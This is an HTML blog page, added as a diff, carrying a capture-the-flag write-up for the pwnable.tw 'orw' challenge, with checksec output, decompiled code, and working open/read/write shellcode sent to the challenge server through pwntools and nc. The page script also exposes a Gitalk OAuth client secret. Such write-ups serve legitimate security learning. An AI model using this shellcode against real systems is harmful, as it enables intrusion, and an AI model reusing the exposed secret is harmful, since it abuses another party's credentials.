@@ -1,0 +1,366 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>eclipse</title>
+<meta name="description" content="Soda Music Computer" />
+<link rel="shortcut icon" href="https://eclipse-yes.github.io/favicon.ico?v=1653911914773">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://eclipse-yes.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://eclipse-yes.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://eclipse-yes.github.io/images/avatar.png?v=1653911914773" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">eclipse</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            Table of Contents
+          </p>
+          <div class="toc-container hidden lg:block">
+            
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          Home
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.2s">
+          Tags
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.4s">
+          Archives
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          Whoami
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://eclipse-yes.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">Challenge 2. orw (pwnable.tw)</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2022-03-16 / 3 min read
+        </div>
+        
+        <div class="post-content yue">
+          <pre><code>❯ file orw
+orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
+❯ checksec orw
+[*] '/root/share/pwn/work/pwnable.tw/2.orw/orw'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+</code></pre>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf(&quot;Give my your shellcode:&quot;);
+  read(0, &amp;shellcode, 0xC8u);
+  ((void (*)(void))shellcode)();
+  return 0;
+}
+</code></pre>
+<p>输入编写的shellcode，并执行getshel。<br>
+提示: Read the flag from <code>/home/orw/flag</code>. Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.</p>
+<p>sys_open(eax=0x5, ebx=file_addr_str)<br>
+sys_read(eax=0x3, ecx=ebx(buff_addr), ebx=0x3(fd), edx=0x50(len))<br>
+sys_write(eax=0x4, ebx=0x1(fd))</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# coding=utf-8
+
+from pwn import *
+
+#io = process('./orw')
+io = remote(&quot;chall.pwnable.tw&quot;,10001)
+
+shellcode = asm(&quot;&quot;&quot;
+                xor     eax, eax
+                xor     ecx, ecx
+                mov     eax, 0x5
+                push    ecx
+                push 	0x67616c66       
+                push 	0x2f77726f       
+                push 	0x2f656d6f       
+                push 	0x682f2f2f
+                mov     ebx, esp
+                int     0x80
+                mov     eax, 0x3
+                mov     ecx, ebx
+                mov     ebx, 0x3
+                mov     dl, 0x50
+                int     0x80
+                mov     eax, 0x4
+                mov     bl, 0x1
+                int     0x80
+                &quot;&quot;&quot;)
+
+io.sendafter(&quot;Give my your shellcode:&quot;, shellcode)
+io.interactive()
+</code></pre>
+<pre><code>; syscall: open('/home/orw/flag')
+xor     eax, eax
+xor     ecx, ecx
+mov     eax, 0x5
+
+push    ecx         ; \x00 string end
+push 	0x67616c66  ; flag
+push 	0x2f77726f  ; orw/
+push 	0x2f656d6f  ; ome/     
+push 	0x682f2f2f  ; ///h
+mov     ebx, esp
+int     0x80
+
+; syscall: read
+mov     eax, 0x3
+mov     ecx, ebx ; ebx is the buf addr
+mov     bl, 0x3 ; fd: 0,1,2,3-&gt;file
+mov     dl, 0x50 ; len
+int     0x80
+
+; syscall: write
+mov     eax, 0x4
+mov     bl, 0x1 ; fd: stdout
+int     0x80
+</code></pre>
+<p>Other wps<br>
+Reference: https://pwnable.tw/writeup/2/184 by akiym</p>
+<pre><code>.intel_syntax noprefix
+.globl _start
+_start:
+    jmp loadstring
+file_read:
+    pop ebx
+    xor eax,eax
+    xor ecx,ecx
+    xor edx,edx
+    mov al,0x5
+    int 0x80
+
+    mov ebx,eax
+    mov ecx,esp
+    mov dl,0x40
+    mov al,0x3
+    int 0x80
+
+    xchg eax,edx
+    mov bl,0x1
+    mov al,0x4
+    int 0x80
+
+    ret
+loadstring:
+    call file_read
+    .asciz &quot;/home/orw/flag&quot;
+</code></pre>
+<pre><code>% asm -i sc.S -o sc
+% nc chall.pwnable.tw 10001 &lt; sc
+</code></pre>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://eclipse-yes.github.io/tag/v6fcRAOlh/">
+            <span class="flex-auto">Pwn</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://eclipse-yes.github.io/post/I404HkphT/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  Data Structure in C
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://eclipse-yes.github.io/post/lHAnG6xjF/">
+                <h3 class="post-title">
+                  Challenge 1. start (pwnable.tw)
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'db9fabe620a06234a7f9',
+    clientSecret: '6905d50caf137022592dab848db298bc97e48f4f',
+    repo: 'eclipse-yes.github.io',
+    owner: 'eclipse-yes',
+    admin: ['eclipse-yes'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+      </div>
+    </div>
+
+    <script src="https://eclipse-yes.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
